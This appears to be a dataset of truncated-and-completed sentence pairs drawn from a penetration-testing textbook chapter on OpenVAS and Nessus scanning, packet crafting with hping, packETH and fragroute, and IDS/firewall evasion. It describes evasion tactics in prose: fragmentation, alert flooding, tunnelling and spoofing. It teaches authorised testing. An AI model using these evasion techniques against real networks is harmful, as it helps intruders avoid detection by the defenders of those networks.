"there is a fully functional evaluation version , but it does require you","there is a fully functional evaluation version , but it does require you to wait while the license message shows when you start up the application"
you can then start hunting and pecking at those ports after doing,you can then start hunting and pecking at those ports after doing a lot of research about what vulnerabilities may exist within those applications
you could also just find a lot of exploits and,you could also just find a lot of exploits and start throwing them at the applications on the open ports
"blind testing can lead to unexpected results , and one of your","blind testing can lead to unexpected results , and one of your objectives , from an ethical standpoint , is to cause no harm"
"however , your job is to control it as best you can and to","however , your job is to control it as best you can and to ensure that your client or employer is aware of the possible ramifications of your testing"
it wouldn ’ t be very professional to tell your client that you ’ re just going to throw a lot,it wouldn ’ t be very professional to tell your client that you ’ re just going to throw a lot of exploits at their system without any idea what the impact would be and that they may experience outages as a result
your job is to control your testing—to be knowledgeable about,your job is to control your testing—to be knowledgeable about what you are doing and what the possible outcomes are
"another issue is that if you are engaged in a red team test where the target has no idea you are running attacks ,","another issue is that if you are engaged in a red team test where the target has no idea you are running attacks , you want to be sure they don ’ t detect you , or at least you want to do everything you can to avoid detection"
"blindly running a lot of exploits against a lot of systems , including systems that may not even have the application that","blindly running a lot of exploits against a lot of systems , including systems that may not even have the application that ’ s vulnerable , is going to be noisy , and if there is any detection capability , you will be caught"
a better approach is to use a vulnerability scanner,"a better approach is to use a vulnerability scanner , which takes an intelligent approach to identifying potential vulnerabilities"
"a vulnerability scanner will identify open ports and listening applications ,","a vulnerability scanner will identify open ports and listening applications , then determine what vulnerabilities may be possible based on those applications"
the objective of a scanner is not to compromise,"the objective of a scanner is not to compromise a system , it is just to identify potential vulnerabilities"
it means that the scanner has found something it believes is a vulnerability based,it means that the scanner has found something it believes is a vulnerability based on interactions with the target system as compared with data the vulnerability scanner has
this may include investigating the actual interaction as presented by the scanner—sometimes it ’,"this may include investigating the actual interaction as presented by the scanner—sometimes it ’ s based on return codes without looking at the actual data , for instance"
✓ ■true positive : the scanner has identifi ed a vulnerability that,"✓ ■true positive : the scanner has identifi ed a vulnerability that , after manual investiga- tion , turns out to be a legitimate vulnerability"
✓ ■ true negative : the scanner has not identifi ed,✓ ■ true negative : the scanner has not identifi ed a vulnerability and there is not a vul- nerability to identify
"for a historical perspective , it ’ s worth noting","for a historical perspective , it ’ s worth noting that network vulnerability scanners have been around since the early 1990s"
"the fi rst one , developed by dan farmer and wietse venema","the fi rst one , developed by dan farmer and wietse venema , was known as security analysis tool for auditing networks ( satan )"
satan then spawned additional tools like security auditors research assistant ( sara,satan then spawned additional tools like security auditors research assistant ( sara ) and security administrator ’ s integrated network tool ( saint )
while perl has been replaced by other languages for,"while perl has been replaced by other languages for mod-ern vulnerability scanners , they do generally use web interfaces"
i had tried to grab a copy of satan just to run it,"i had tried to grab a copy of satan just to run it again for fun , since i last ran it 30 or so years ago"
"however , you can still get a copy of sara , which hasn ’","however , you can still get a copy of sara , which hasn ’ t been updated in years , and saint , which is now a commercial product"
"openvas satan was open-source , meaning you could look at everything satan was doing and","openvas satan was open-source , meaning you could look at everything satan was doing and , if you felt like it , extend its functionality by adding in modules yourself"
it was initially released in 1998 as a freely available vulnerability scanner and remained so until 2005 when the,"it was initially released in 1998 as a freely available vulnerability scanner and remained so until 2005 when the company , formed three years before , closed the source code , making all future development proprietary to the company"
"at that point , the existing nessus source was version","at that point , the existing nessus source was version 2 and the fi rst version from tenable was version 3"
"the existing source code for version 2 was open , however , and two separate projects were created , where the","the existing source code for version 2 was open , however , and two separate projects were created , where the nessus code for version 2 , abandoned by the nessus developers , was forked to create a basis for the new projects"
"over time , though , openvas developed its own application architecture","over time , though , openvas developed its own application architecture , using multiple tiers that nessus hadn ’ t explicitly used"
nessus initially had a native application client to manage the,"nessus initially had a native application client to manage the scans , and openvas continued to use the same native application"
7 greenbone security assistant openvas allows you to have multiple,"7 greenbone security assistant openvas allows you to have multiple users , each of which may have different permis- sions"
"when you install openvas , the admin user is created as","when you install openvas , the admin user is created as part of the setup process and a random password is generated"
you may do this in order to provide a network block in your,"you may do this in order to provide a network block in your target list , but you may also have fragile systems in that network block"
8 creating a target in openvas you will also see that,8 creating a target in openvas you will also see that you can create a set of ports that you want to scan
one thing a vulnerability scanner like openvas does is scan ports,one thing a vulnerability scanner like openvas does is scan ports in order to determine which ones it should be focusing testing on
this can limit the amount of testing you do,this can limit the amount of testing you do if you only care about testing against particular ser-vices
you aren ’ t always going to be doing black box testing,"you aren ’ t always going to be doing black box testing , meaning you aren ’ t always going to have no information"
those details can be very useful because they can help you get,those details can be very useful because they can help you get a deeper sense of the vulnerabilities your target organization is subject to
"the credentials , when provided to openvas , will allow the scanner","the credentials , when provided to openvas , will allow the scanner to look at local vulnerabilities and not just network or remote vulnerabilities"
"while you can create credentials from the target window ,","while you can create credentials from the target window , you can also just create cre- dentials from the configuration menu"
"when you indicate that you want to create creden-tials , whether you ’ re in the cap target create window or","when you indicate that you want to create creden-tials , whether you ’ re in the cap target create window or you are just going to credentials from the configuration menu , you are going to get the window shown in figure 5"
you can create credentials that can be used,"you can create credentials that can be used across multiple protocols , using different authenti-cation schemes"
9 creating credentials in openvas one of the issues with this is that it assumes the same credentials,"9 creating credentials in openvas one of the issues with this is that it assumes the same credentials are used across mul- tiple systems , since you can only apply one set of credentials per protocol"
you will be asked to provide a name for it,you will be asked to provide a name for it and then indicate which base template you want to start with
you ’ ll know how you want to think about this based on what,you ’ ll know how you want to think about this based on what you are doing—start from scratch and build up or pare down from a large chunk
"you ’ ll likely want to tune it , though ,","you ’ ll likely want to tune it , though , so you are running tests that are significant to your target network"
openvas will make determinations about what tests to run,openvas will make determinations about what tests to run based on what it finds from some initial scans
"not only can you determine whether to enable families , and which nvts to enable ,","not only can you determine whether to enable families , and which nvts to enable , but you can also determine how a family keeps up as nvts are added over time"
you can select to keep the config static or you can have,you can select to keep the config static or you can have openvas enable new ones as they are added to the openvas installation
clicking on this will bring up a dialog showing you,clicking on this will bring up a dialog showing you where there may be preferences that relate to that nvt
"in the fire-wall nvts , for instance , there are time-out values that","in the fire-wall nvts , for instance , there are time-out values that you can change if you don ’ t want to use the default value"
"from a liability perspective , it means that vulnerabilities were identified","from a liability perspective , it means that vulnerabilities were identified , meaning they were known , without anything being done about them"
at least some analysis should be performed in order to docu-ment a,"at least some analysis should be performed in order to docu-ment a response to each vulnerability , based on a risk assessment and company policy"
you ’ ll be able to create the target as part of creating a scan,you ’ ll be able to create the target as part of creating a scan task and it will persist just as if you had gone to the target configuration separately
"the scan config , though , has to be done ahead of","the scan config , though , has to be done ahead of time unless you want to use one of the prepackaged scan configs"
"when you go to the scans menu and then select tasks ,","when you go to the scans menu and then select tasks , you will get something that looks like what you see in figure 5"
"13 openvas tasks when you start a scan , you will see","13 openvas tasks when you start a scan , you will see a light-blue icon in the upper left with a star in it"
14 openvas task creation you can create a schedule for,"14 openvas task creation you can create a schedule for the scan , but by default there is no schedule"
these are two configura-tion elements you will want to make sure you check,these are two configura-tion elements you will want to make sure you check on since they are the most important and relevant factors for your scan
you will also be able to define the source,you will also be able to define the source interface in case you have multiple interfaces on your scanner
this may depend on whether you are trying to hide your activities and whether you think a,this may depend on whether you are trying to hide your activities and whether you think a random selection of hosts will potentially make it look less obvious that you are running a scan
you can also help with that by reducing the number of simultaneously scanned hosts,you can also help with that by reducing the number of simultaneously scanned hosts as well as the maximum number of concurrent nvts tested against a single host
"in order to start up the scan , you will need to look at your list of","in order to start up the scan , you will need to look at your list of tasks and click the green arrow that looks like a start button on an audio or video player"
"this is where the schedule can be useful , because openvas will start","this is where the schedule can be useful , because openvas will start the scan for you when you say rather than expecting you to start it"
"however , you will also be able to review","however , you will also be able to review all of the completed scans and review historic vulnerabilities"
the scans dashboard will provide you with charts for visualization of your vulnerabilities over time,the scans dashboard will provide you with charts for visualization of your vulnerabilities over time so you can get a sense of whether the security posture of your target is improving
at the bottom of this figure you can see a synopsis,at the bottom of this figure you can see a synopsis of the two scans that have been run in this installation
this should provide you with enough information so,this should provide you with enough information so you will know essentially what the vulner-ability is
"you may also see mitigation , which means there are ways","you may also see mitigation , which means there are ways to alleviate the impact if the vulnerability were to be exploited"
"16 are issues that have vendor fixes , there are also issues","16 are issues that have vendor fixes , there are also issues found that have no fixes as well as issues that have mitigations"
"this is the quality of detection , and what it means is","this is the quality of detection , and what it means is how certain openvas is about whether the vulnerability is a true positive"
considering that the systems identified are running the latest macos and were fully,"considering that the systems identified are running the latest macos and were fully patched at the time of the scan , these high confidence numbers are misleading"
to understand exactly what openvas was looking for to make the determination,to understand exactly what openvas was looking for to make the determination would require looking at the nasl file associated with the identified vulnerability
since these reports remain stored in openvas as long as the instance,"since these reports remain stored in openvas as long as the instance remains , you probably want to make necessary changes to the findings"
you can see the dialog box that lets you set override parameters,"you can see the dialog box that lets you set override parameters , including setting the severity to false positive , in figure 5"
"17 setting an override of course , false positive is","17 setting an override of course , false positive is not the only change to severity that you can make"
"you may know quite a bit more than openvas does , especially if you either work for the","you may know quite a bit more than openvas does , especially if you either work for the company you are testing for or you are working closely with them rather than as a strict adversary"
"you can also set other parameters in the override , if it","you can also set other parameters in the override , if it ’ s not a matter of severity that you want to change"
"if you were to override the severity , you probably want to add a","if you were to override the severity , you probably want to add a note as well , explaining what the change was and why it was being made"
in addition to making changes to parameters like severity,"in addition to making changes to parameters like severity , you can add notes to each of the findings"
using notes and overrides allows you to use openvas as more of a vulnerability,"using notes and overrides allows you to use openvas as more of a vulnerability man- agement tool , to some degree , rather than just a vulnerability scanner"
"you can use it for historical purposes , to","you can use it for historical purposes , to identify known vulnerabilities or make alterations to different parameters"
this stored information may be useful because anyone tasked with,this stored information may be useful because anyone tasked with protecting systems and networks will be constantly fighting against vulnerabilities
"historical infor-mation , especially mitigations and what was done to","historical infor-mation , especially mitigations and what was done to remediate the vulnerabilities , will be useful for security professionals"
"nessus nessus is the parent of openvas , which makes it worth looking","nessus nessus is the parent of openvas , which makes it worth looking at , especially to see how it has diverged from the path openvas took"
"while nessus is a commercial product , there is a home license so you can use","while nessus is a commercial product , there is a home license so you can use it on your home network to compare against openvas and also see another approach to vulnerability scanning"
"in order to start a scan , you would click on the new button ,","in order to start a scan , you would click on the new button , which will take you to a list of the different scan policies that are available"
this means these scan policies are only available in,this means these scan policies are only available in the commercial version and not available in the home license
keep in mind that you are creating a configuration,keep in mind that you are creating a configuration here and you can run that configuration multiple times
"each run will have a time stamp associated with it , so you don","each run will have a time stamp associated with it , so you don ’ t need to add your own date and time as part of the name"
you ’ ll want to name it something that is meaningful,you ’ ll want to name it something that is meaningful to you so you can differentiate this configuration from other configurations
"19 scan configuration settings you might , for instance , have","19 scan configuration settings you might , for instance , have a configuration where you have a specific set of creden- tials"
you could use ssh key authentication for some sys-tems and then also,you could use ssh key authentication for some sys-tems and then also have an authentication setting for where you need to use username and password
"in order to create another set of credentials , there is","in order to create another set of credentials , there is a button at the end of the line indicating the credential type"
"in addition to host credentials , you can set authentication","in addition to host credentials , you can set authentication credentials for database , mis- cellaneous , and plain text"
this provides the means for nessus to check local,this provides the means for nessus to check local vulnerabilities across a variety of applications and also devices
"20 credentials configuration settings in addition to credentials ,","20 credentials configuration settings in addition to credentials , you can configure the plug-ins that you want to run"
"this not only provides you with access to the basic settings that you can see ,","this not only provides you with access to the basic settings that you can see , it also provides you with access to discovery , assessment , report , and advanced configurations"
the discovery tab lets you determine the type of discovery you will be,"the discovery tab lets you determine the type of discovery you will be doing on the network , meaning it lets you set port scan parameters"
"you can select to let it run against all ports , which may mean","you can select to let it run against all ports , which may mean you could find additional vulnerabilities or at least some ports you may not have expected"
the assessment tab lets you set parameters on,the assessment tab lets you set parameters on what nessus should scan with respect to web vulnerabilities
"in order to get access to all of the settings , you should go","in order to get access to all of the settings , you should go through the advanced scan , where all the settings are exposed and can be changed"
you may want to limit the number of details,"you may want to limit the number of details provided , keeping information in the report to a minimum"
each finding will contain details about the vulnerability as well as,"each finding will contain details about the vulnerability as well as its severity , references associated with the vulnerability , and potential remedia-tions"
including enough detail so everything will make enough sense to people who may,including enough detail so everything will make enough sense to people who may not be very familiar with nessus can take up a lot of space
"alongside the list of vulnerabilities identified , you will see a chart of","alongside the list of vulnerabilities identified , you will see a chart of all of the identified vulnerabilities to indicate which categories have the most vulnerabilities"
"in the case of the scan shown , the vast majority are informational messages","in the case of the scan shown , the vast majority are informational messages , while the second highest number of vulner-abilities are in the medium severity category"
21 scan results list the list of hosts is ordered by the total number of issues identified by,"21 scan results list the list of hosts is ordered by the total number of issues identified by nessus , though findings are not all vulnerabilities since there are informational items , which are not vul-nerabilities"
52 had the highest number of vulnerabilities based on,52 had the highest number of vulnerabilities based on vulnerabilities nessus knew about at the time of the scan
"it ’ s also possible for there to be false negatives , meaning nessus didn ’ t","it ’ s also possible for there to be false negatives , meaning nessus didn ’ t identify a known vulnerability in spite of the fact that the vulner-ability existed on the scanned host"
this shows the version of the application found as well,this shows the version of the application found as well as the current version of the application that is available
"this shows that the version installed is five versions back , and","this shows that the version installed is five versions back , and the current version available and supported by the mozilla foundation is 61"
what you don ’ t see in this output is the,what you don ’ t see in this output is the ip address of the second host where this problem was identified
23 that the four remediations identified are all related to upgrading to the latest version of,"23 that the four remediations identified are all related to upgrading to the latest version of software , including , in one case , updating the version of the operating system in use"
"23 remediations list as has been noted several times , severities will vary , and just because nessus believes a severity should be","23 remediations list as has been noted several times , severities will vary , and just because nessus believes a severity should be at a certain level doesn ’ t mean that you , with your knowledge of the environment you are working with , will agree"
you can create rules in nessus so findings,you can create rules in nessus so findings associated with certain hosts may be automatically recategorized
"with all the parameters in place to identify what the rule applies to , you","with all the parameters in place to identify what the rule applies to , you just set the severity you want associated and nessus will take care of the rest"
if you want to see exactly what a plug-in does so,"if you want to see exactly what a plug-in does so you can verify the finding , you should check the script"
"the script , once you get used to reading them , will provide you","the script , once you get used to reading them , will provide you with the details on how to replicate the vulnerability test so you can verify"
"this veri-fication is not only important to rule out false positives , but if it is actually a","this veri-fication is not only important to rule out false positives , but if it is actually a vulnerability , you will need to have documentation to present to the company or organization you are working with"
"additionally , if you are expected to identify as many vulner-abilities as you can","additionally , if you are expected to identify as many vulner-abilities as you can , you will need to move to exploiting these vulnerabilities in hopes of identifying more"
while this may require the use of exploit tools like metasploit or even tools that are,"while this may require the use of exploit tools like metasploit or even tools that are custom-developed , it could be that you need to create a packet that looks a particular way"
"no matter what the findings are , though ,","no matter what the findings are , though , they need to be verified before being presented as findings"
"packet crafting and manipulation when you are sending data out over the network ,","packet crafting and manipulation when you are sending data out over the network , there is a clear path it follows before exiting the network interface on your system"
"we ’ ve gone over this , to a degree ,","we ’ ve gone over this , to a degree , by talking about the open systems interconnection ( osi ) model"
your browser takes the input and creates the http,your browser takes the input and creates the http request headers that are needed to send to the server
"for simplicity , we ’ ll skip the encryption pieces","for simplicity , we ’ ll skip the encryption pieces and just talk about how the complete packet is put together"
"unless otherwise provided , the port number will default to either 80","unless otherwise provided , the port number will default to either 80 or 443 , depending on whether the communication is https or http"
this information will allow the operating system to create the necessary,"this information will allow the operating system to create the necessary headers for both tcp and ip , layers 4 and 3"
"it follows a clear path , and the information placed into the necessary headers for","it follows a clear path , and the information placed into the necessary headers for each protocol is coherent and easily traced back to the original source of the information"
"each header field is a known size and is binary , which means you aren","each header field is a known size and is binary , which means you aren ’ t going to be sending a character instead of a number , for instance"
"nothing in the network head-ers , looking at layers 4 and below for sure ,","nothing in the network head-ers , looking at layers 4 and below for sure , is data that would go through an ascii decode to be converted to character data"
some of these are designed for the sole purpose of creating,some of these are designed for the sole purpose of creating packets that would look the way you want them to look
others have other purposes that allow you to interact with the target sys-tem in a,others have other purposes that allow you to interact with the target sys-tem in a way that you may not otherwise be able to do without writing your own program
"finally , you may want to mangle the packet using a set of rules , which would put the","finally , you may want to mangle the packet using a set of rules , which would put the operating system ’ s network stack to the test , to see if it can handle poorly constructed packets"
"since hping is primarily a packet crafting program , allowing you to initiate connections using different protocols","since hping is primarily a packet crafting program , allowing you to initiate connections using different protocols with the header settings you want , the default mode may not work very well for you"
"by default , if you don ’ t specify anything other than the target host or ip","by default , if you don ’ t specify anything other than the target host or ip address , hping will send messages to port 0 on your target with a varying source address"
"while you can use hping as a replacement for the ping program , by calling it with the","while you can use hping as a replacement for the ping program , by calling it with the -1 parameter , meaning you are using icmp mode , you can also create connections to specific ports"
"you will get the same behavior you would get with the ping program , mean-ing","you will get the same behavior you would get with the ping program , mean-ing you will be getting the “ aliveness ” of the system and the round-trip time"
"you will get something even more detailed , though , since","you will get something even more detailed , though , since you will know whether a particular service is up and running"
this includes the syn and ack fl ags as well as the,"this includes the syn and ack fl ags as well as the don ’ t fragment bit , indicated by the df in the response"
"you can see a lot of other details as well , including the ip identifi cation","you can see a lot of other details as well , including the ip identifi cation number , the rela-tive sequence number , and the window size as provided by the target host"
"in the case of a port where there is no listener , you won ’ t get a message indicating","in the case of a port where there is no listener , you won ’ t get a message indicating that the host is unreach-able or that the message timed out , as you would with a standard ping program"
"instead of showing sa for fl ags , meaning that the syn and ack fl","instead of showing sa for fl ags , meaning that the syn and ack fl ags were set , you will see ra , meaning the rst and ack fl ags"
"you will still get all of the other information , including the round-trip time , which will tell you how quick","you will still get all of the other information , including the round-trip time , which will tell you how quick the target system is to respond to these messages , which will be a factor of network and operating system responsiveness"
"when a programmer uses raw sockets , the program is expected to handle all the","when a programmer uses raw sockets , the program is expected to handle all the things the network stack does , meaning all the values in the headers should be set"
raw sockets provide the programmer with complete control,raw sockets provide the programmer with complete control over what the packet will end up looking like
none of it has to be considered legal from the standpoint,"none of it has to be considered legal from the standpoint of the protocols , if you aren ’ t expecting responses back"
"the offset for the tcp headers is being set incorrectly , which","the offset for the tcp headers is being set incorrectly , which means the target network stack is being pointed to the wrong place"
"the source port is being set to 15 , which would require administrative privileges to do","the source port is being set to 15 , which would require administrative privileges to do , as do most things in hping , consid-ering it is generally using something called raw sockets"
there are fewer parameters used to send udp messages because,there are fewer parameters used to send udp messages because of the limited number of options available in the udp headers
what was trun-cated from the output was all of the port,what was trun-cated from the output was all of the port numbers and associated service names that were found not to be listening
"using the -a parameter , followed by an ip address ,","using the -a parameter , followed by an ip address , will have hping change the source address in messages going out"
this will mean that you won ’ t get any responses,"this will mean that you won ’ t get any responses , because responses will be sent to the source address you specify"
"1 ) , port 1-10241024 ports to scan , use -v to see all the replies+ -- -- + -- -- -- -- -- -+ -- -- -- -- -+ -- -+ -- -- -+ -- -- -+ --","1 ) , port 1-10241024 ports to scan , use -v to see all the replies+ -- -- + -- -- -- -- -- -+ -- -- -- -- -+ -- -+ -- -- -+ -- -- -+ -- -- -+|port| serv name | flags |ttl| id | win | len |+ -- -- + -- -- -- -- -- -+ -- -- -- -- -+ -- -+ -- -- -+ -- -- -+ -- -- -+all replies received"
not responding ports : ( 1 tcpmux ) ( 2 nbp ) ( 3 ) ( 4 echo ) ( 5 ) ( 6 zip ) ( 7 echo ) ( 8 ) ( 9 discard ) ( 10 ) ( 11 systat ) ( 12 ) ( 13 daytime ) ( 14 ),not responding ports : ( 1 tcpmux ) ( 2 nbp ) ( 3 ) ( 4 echo ) ( 5 ) ( 6 zip ) ( 7 echo ) ( 8 ) ( 9 discard ) ( 10 ) ( 11 systat ) ( 12 ) ( 13 daytime ) ( 14 ) ( 15 netstat ) ( 16 ) ( 17 qotd ) ( 18 msp ) ( 19 chargen ) ( 20 ftp-data ) ( 21 ftp ) ( 22 ssh ) ( 23 telnet ) ( 24 ) one other feature worth mentioning is the ability to send packets of any size you want
you may be able to crash the application,you may be able to crash the application because the data being sent could violate protocol specifications
"packeth where hping uses command-line parameters , packeth takes a","packeth where hping uses command-line parameters , packeth takes a gui approach to being able to set all of the parameters"
"when you select which protocols you are using , packeth will adjust","when you select which protocols you are using , packeth will adjust to provide all of the header fields for the protocol you have selected"
"you can ’ t see the layer 2 header in this screen capture , but you would be able to","you can ’ t see the layer 2 header in this screen capture , but you would be able to set addresses , determine what version of the layer 2 protocol you are using , and also add in 802"
"25 packeth interface in addition to setting headers , you","25 packeth interface in addition to setting headers , you can add your own data that would go into the payload"
"you don ’ t have to have data to include , though ,","you don ’ t have to have data to include , though , if you would prefer to just have data filled in to a certain size"
you ’ ll notice that it is formatted just as you ’ d expect,"you ’ ll notice that it is formatted just as you ’ d expect a hexadecimal dump to be formatted , with each hexadecimal byte separated from the others"
26 data pattern fill while you can create packets following known,"26 data pattern fill while you can create packets following known and understood fields , you can also create your own packets"
your layer 2 headers have to be set with mac addresses in the source and destination so there is somewhere,"your layer 2 headers have to be set with mac addresses in the source and destination so there is somewhere for the frame to go , but beyond that , you can do whatever you like by selecting user defined payload"
this would leave out all layer 3 information and only include what you,"this would leave out all layer 3 information and only include what you wanted to include , whether it ’ s text or a hexadecimal fill pattern"
using text caused an error with the next-layer protocol specified,using text caused an error with the next-layer protocol specified because it ’ s not set up to take raw text
you ’ ll see at the bottom of the screen capture that,"you ’ ll see at the bottom of the screen capture that 60 bytes were sent , which includes the network layer payload we specified"
"if you want to send more than a single packet ,","if you want to send more than a single packet , you will have to use either the gen-b or gen-s button"
"you ’ ll be able to indicate the bandwidth you want to use , or","you ’ ll be able to indicate the bandwidth you want to use , or you could also indicate the inter-packet gap , which is the delay between packets being sent"
"once you have the pattern defined by indicating the pack-ets you want to use ,","once you have the pattern defined by indicating the pack-ets you want to use , you can tell packeth how you want to send them—burst , continuous , or random"
"this allows you to create a number of packets and load them into gen-s mode , but it also allows","this allows you to create a number of packets and load them into gen-s mode , but it also allows you to create a packet and load it up to send it anytime you want without having to re-create the packet"
if you want to use an existing packet you have captured as your,"if you want to use an existing packet you have captured as your starting point , you can also load a packet capture ( pcap ) file"
27 network layer data fill fragroute fragroute is a program used,27 network layer data fill fragroute fragroute is a program used to mangle packets before they are sent to a target you specify
it works by making adjustments to the routing table so all,it works by making adjustments to the routing table so all messages going to the target are sent through the fragroute application first
this configuration file has directives telling fragroute how,this configuration file has directives telling fragroute how to handle packets that pass through the application
in the following code listing you can see a configuration file with,in the following code listing you can see a configuration file with a handful of directives that are guaranteed to create really messed-up network traffic
"when messages are sent out , they have a maximum transmission unit","when messages are sent out , they have a maximum transmission unit ( mtu ) size that is dictated by the data link protocol"
"with ethernet , that is 1,500 bytes , though it ’","with ethernet , that is 1,500 bytes , though it ’ s possible to get something called jumbo frames that are much larger"
the line starting with tcp_chaff does the same thing,"the line starting with tcp_chaff does the same thing that ip_chaff does , working instead on the transport layer"
"we could also have had invalid checksums , older time","we could also have had invalid checksums , older time stamps , or other bogus information in the tcp header"
this would have caused these mes-sages to be rejected,"this would have caused these mes-sages to be rejected on the far end of the conversation , after inspection"
"finally , the order of the messages will be randomized , so they will be out","finally , the order of the messages will be randomized , so they will be out of order and need reassembly on the far end , then message details will be printed"
this is the configuration file that was installed by,this is the configuration file that was installed by default with the fragroute pack-age on a kali linux system
4433 : s 2873730507:2873730507 ( 0 ) win 29200 < mss 1460,"4433 : s 2873730507:2873730507 ( 0 ) win 29200 < mss 1460 , sackok , timestamp 770861436 0 , nop , wscale 7 > 192"
4433 : s 2873730507:2873730507 ( 0 ) win 29200 < mss 1460,"4433 : s 2873730507:2873730507 ( 0 ) win 29200 < mss 1460 , sackok , timestamp 770862448 0 , nop , wscale 7 > 192"
4433 : s 2873730507:2873730507 ( 0 ) win 29200 < mss 1460,"4433 : s 2873730507:2873730507 ( 0 ) win 29200 < mss 1460 , sackok , timestamp 770864464 0 , nop , wscale 7 > 192"
"in the preceding example , i used openssl s_client","in the preceding example , i used openssl s_client to initiate a connection with the web server using ssl/tls"
"the connection never completed , presumably because the packets getting to the target were so mangled","the connection never completed , presumably because the packets getting to the target were so mangled and out of order that the network stack didn ’ t know what to make of them"
"sometimes , the point is just to see if you can make the network stack on the target system fail ,","sometimes , the point is just to see if you can make the network stack on the target system fail , which may take the kernel with it , causing the entire system to be unavailable , forcing a reboot or restart"
evasion techniques any target organization you test against,evasion techniques any target organization you test against will have security mechanisms in place to defend itself
any of these could thwart your efforts by either blocking them or by,"any of these could thwart your efforts by either blocking them or by issu-ing an alert , which may result in the discovery of your actions"
"fortunately , there are some evasion techniques that may help","fortunately , there are some evasion techniques that may help you get around these devices so you can keep plugging along"
the common evasion techniques are as follows : hide/obscure the data,the common evasion techniques are as follows : hide/obscure the data you could use encryption or obfuscation to disguise what you are doing
the goal with encryption is that the message is encrypted from the,"the goal with encryption is that the message is encrypted from the sender to the recipient , without being decrypted at waypoints in between"
"you could also encode the data using various encoding techniques , including url","you could also encode the data using various encoding techniques , including url encoding , which replaces charac-ters with the hexadecimal value of their ascii code"
alterations intrusion detection/protection systems in particular,alterations intrusion detection/protection systems in particular will often use something called a signature
"in the case of malware , this may be a cryptographic","in the case of malware , this may be a cryptographic hash value that can be compared against a database of known malware"
"when it comes to a cryptographic hash , though , the change of a single character in the file","when it comes to a cryptographic hash , though , the change of a single character in the file contents will yield a completely different hash value , meaning whatever you are doing won ’ t get detected"
"fragmentation fragmentation attacks can be used to evade network security mechanisms simply because these devices , when","fragmentation fragmentation attacks can be used to evade network security mechanisms simply because these devices , when they are inline , would take time to reassemble the mes-sages before the adversarial activity would be seen"
this reassembly takes time and so some devices just don ’,this reassembly takes time and so some devices just don ’ t bother because the reassembly and detection can add latency to commu-nications
"overlaps when messages are fragmented , it may happen at either the network","overlaps when messages are fragmented , it may happen at either the network layer or the transport layer , as you saw from looking at fragroute"
you may send two tcp segments that appear to occupy,you may send two tcp segments that appear to occupy the same space in the puzzle being put back together
the os needs to decide whether the first mes-sage received,the os needs to decide whether the first mes-sage received was valid or the last message received was more valid
even if you aren ’ t violat- ing the rules but instead,"even if you aren ’ t violat- ing the rules but instead are taking advantage of loopholes , you can get some useful data"
"similarly , there are details in the protocols","similarly , there are details in the protocols that may be handled differently across different network stacks"
"this can be very time-consuming to perform , but when you are talking about individual messages ,","this can be very time-consuming to perform , but when you are talking about individual messages , it ’ s far less likely that the ids or firewall would identify them as a port scan"
resource consumption it may be possible to get devices to,resource consumption it may be possible to get devices to fail open by consuming resources such as cpu or memory
"if you can exhaust either of these resources , it may be possible","if you can exhaust either of these resources , it may be possible to get subsequent messages to just pass through once the device has failed"
"if you can generate enormous volumes of alerts from traffic you don ’ t care about , you can cause the people looking at the alerts","if you can generate enormous volumes of alerts from traffic you don ’ t care about , you can cause the people looking at the alerts to go screen blind , meaning they just aren ’ t seeing the important details anymore because they are overwhelmed by what they are looking for"
"this way , you can set up a smoke screen with a lot","this way , you can set up a smoke screen with a lot of bogus alert traffic and then send your real data through the screen"
"for example , the generic routing encapsulation ( gre ) protocol can","for example , the generic routing encapsulation ( gre ) protocol can create a tunnel by taking packets and encapsulating them inside of gre packets"
this makes it look like what is passing through is,this makes it look like what is passing through is a gre packet when there is really something in the payload
gre is a protocol that has been designed to tunnel traffic in cases where,gre is a protocol that has been designed to tunnel traffic in cases where you want to handle the routing on the receiv-ing end rather than the sending end
these tunneled attacks require software on the receiving end that can,these tunneled attacks require software on the receiving end that can extract the tunneled messages and place them on the target network
"keep in mind that with devices like stateful firewalls , once you get the first message","keep in mind that with devices like stateful firewalls , once you get the first message through , subsequent messages may be allowed by default because they are part of an estab-lished connection"
"there are some that are more likely to work than others ,","there are some that are more likely to work than others , because they don ’ t rely on the firewall or ids vendor"
"encryption , for instance , should always work because the fire-wall and ids simply","encryption , for instance , should always work because the fire-wall and ids simply can ’ t see the data since the keys are negotiated by the two endpoints"
"encryption , though , requires a service on the receiving","encryption , though , requires a service on the receiving end that understands encryption and can negotiate with the sending application"
an evasion technique that doesn ’ t rely on,an evasion technique that doesn ’ t rely on technical means is overwhelming the person looking at the alerts
"this does , though , assume that there isn ’ t technology in place","this does , though , assume that there isn ’ t technology in place to weed out the extraneous messages , only pre-senting interesting alerts to the operator"
summary scanning will provide you with a wealth of information that,summary scanning will provide you with a wealth of information that will be necessary as you move forward with your testing and evaluation
"while there are other port scanners available , including masscan , which is used for high-","while there are other port scanners available , including masscan , which is used for high- speed scanning , nmap is the only port scanner that has a scripting engine built into it"
"the scripting engine for nmap is based on the programming language lua , but nmap provides libraries that will give you easy","the scripting engine for nmap is based on the programming language lua , but nmap provides libraries that will give you easy access to the information nmap has so you can write scripts to better identify services and also perform tests such as identifying vulnerabilities"
"when you write scripts for the nmap scripting engine ( nse ) , you register ports with","when you write scripts for the nmap scripting engine ( nse ) , you register ports with nmap so nmap knows to call your script when it finds the registered port to be open"
"while nmap is commonly a command-line program , there is","while nmap is commonly a command-line program , there is also a gui that acts as a front end for nmap"
"zenmap is a program that will call nmap based on a command speci-fied ,","zenmap is a program that will call nmap based on a command speci-fied , but it will also parse the results , providing them to you in different ways"
"while you can provide the same command to zenmap as you do to nmap ,","while you can provide the same command to zenmap as you do to nmap , zenmap will also provide some scan types that you can run , like an intense scan"
"vulnerability scanners will not only look for vulnerabilities , they will also generally","vulnerability scanners will not only look for vulnerabilities , they will also generally per- form port scanning as part of looking for and identifying open ports"
they probe the targeted host to observe behavior on,they probe the targeted host to observe behavior on the host in order to identify potential vul- nerabilities
"in order to test vulnerabilities and also perform scans , you may need to","in order to test vulnerabilities and also perform scans , you may need to do something other than relying on the operating system to build your packets for you"
this is a tool that can be used for scanning,this is a tool that can be used for scanning but also can be used to create packets using command-line switches
"using these crafted packets , you can get responses","using these crafted packets , you can get responses from your target that may pro-vide you with necessary information"
you will probably want to use techniques to evade those,you will probably want to use techniques to evade those devices since they will likely prevent you from doing your job
"there are multiple ways to evade security technologies , including encryption/encoding , causing","there are multiple ways to evade security technologies , including encryption/encoding , causing the operator to go screen blind , or sending malformed messages to the target"
"a false positive indicates a finding that doesn ’ t exist ,","a false positive indicates a finding that doesn ’ t exist , while a false negative doesn ’ t indicate a finding that does exist"
